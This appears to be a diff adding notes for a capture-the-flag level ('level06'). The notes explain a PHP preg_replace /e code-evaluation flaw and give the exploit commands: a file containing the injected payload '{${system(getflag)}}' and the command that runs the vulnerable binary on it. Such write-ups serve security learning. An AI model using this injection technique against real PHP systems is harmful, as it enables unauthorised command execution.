@@ -1,0 +1,3 @@
+- we can see in level06.php that function x($y, $z) gets the content of the file passed as param of level06 and returns the result of the execution of the x parameter inside of it /e means function result expected
+- echo "[x {\${system(getflag)}]" > /tmp/func
+- ./level06 /tmp/func
